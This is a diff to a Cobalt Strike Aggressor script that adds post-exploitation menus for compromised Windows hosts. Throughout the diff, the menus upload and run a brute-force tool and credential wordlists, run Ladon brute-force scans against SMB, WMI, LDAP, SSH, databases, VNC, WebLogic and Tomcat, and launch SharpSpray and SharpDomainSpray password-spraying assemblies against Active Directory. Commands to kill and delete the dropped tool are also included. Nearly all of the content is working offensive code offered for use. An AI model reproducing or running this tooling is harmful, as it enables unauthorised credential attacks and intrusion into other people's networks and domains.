@@ -2,12 +2,15 @@
 #                            #
 #                            #
 #                            #
-#       Xway.cn@panda        #
+#       xway.cn@panda8       #
+#       secquan.org@panda8   #
+#		t00ls.com@panda8     #
 #                            #
 #                            #
 #                            #
 ##############################
 	    menu "暴力破解" {
+		 menu "crack" {
 			item "上传crack" {
 				$bid = $1;
 				$dialog = dialog("上传crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
@@ -45,15 +48,52 @@ sub crack_run{
 	$thread = $3['thread'];
 	bshell($bid, "crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread");
 }  
+
+			item "关闭crack"{
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "taskkill -f /im crack.exe");
+			}
+		}
         	item "删除crack"{
         	local('$bid');
         	foreach $bid ($1){
             	bshell($1, "del /f /s /q crack.exe");
         	}
 		}  
+		}
 
+		menu "Ladon" {
+			item "上传字典" {
+				$bid = $1;
+				$dialog = dialog("上传字典", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &brute_wordlist);
+				drow_file($dialog, "user", "user.txt: ");
+				drow_file($dialog, "pass", "pass.txt: ");				
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub brute_wordlist {
+		bcd($bid, $3['UploadPath']);
+        bupload($bid, $3['user']);
+		bupload($bid, $3['pass']);
+    }
+	
+			item "Ladon-brute" {
+				$bid = $1['@'];
+				$dialog = dialog("Ladon", %(ip => "192.168.1.0/24",bid => $bid), &Ladon_brute);
+				dialog_description($dialog, "ladon爆破,需要上传user.txt与pass.txt。ssh:Ladon 192.168.1.8/24 SshScan Ladon 192.168.1.8:22 SshScan;weblogic:Ladon http://192.168.1.8:7001/console WeblogicScan Ladon 192.168.1.8/24 WeblogicScan;tomcat:Ladon 192.168.1.8/24 TomcatScan Ladon http://192.168.1.8:8080/manage TomcatScan;HttpBasicScan:Ladon http://192.168.1.8/login HttpBasicScan");
+				drow_combobox($dialog, "type", "type:", @("SmbScan","WmiScan","LdapScan","SmbHashScan","WmiHashScan","SshScan","MssqlScan","OracleScan","MysqlScan","VncScan","HttpBasicScan","WeblogicScan","TomcatScan"));
+				drow_text($dialog, "ip", "ip:  ");			
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }
+sub Ladon_brute {
+	$arg = join(' ',  @($3['ip'],$3['type']));
+	bexecute_assembly($bid, script_resource("/script/Ladon1.exe"), $arg);
+}
+				}
 
-			item "SharpSpray" {
+			item "SharpSpray(域用户数多会可能卡死服务器)" {
 			$bid = $1['@'];
 			$dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "15",bid => $bid), &SharpSpray);
 			dialog_description($dialog, "使用LDAP对域的所有用户执行密码喷雾攻击,seeds指定几个密码生成字典,逗号分隔,passwords指定密码爆破,可多个密码,逗号分隔,delay:密码喷雾的延迟,毫秒为单位,sleep:密码猜测之间sleep周期分钟数");
@@ -68,5 +108,21 @@ sub SharpSpray {
 	$arg = join(' ',  @($3['type'],$3['passwd'],"--Sleep",$3['Sleep'],"--Delay",$3['Delay']));
 	bexecute_assembly($bid, script_resource("/script/SharpSpray.exe"), $arg);
 }
+
+			item "SharpDomainSpray" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpSpray", %(passwd => "123456",bid => $bid), &SharpDomainSpray);
+			dialog_description($dialog, "使用密码，然后在域中找到用户，并尝试使用该给定的密码向域进行身份验证");
+			drow_text($dialog, "passwd", "passwd:  ");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpDomainSpray {
+	$arg = join(' ',  @($3['passwd']));
+	bexecute_assembly($bid, script_resource("/script/SharpDomainSpray.exe"), $arg);
+}
+
+
+
 	  
 	  }
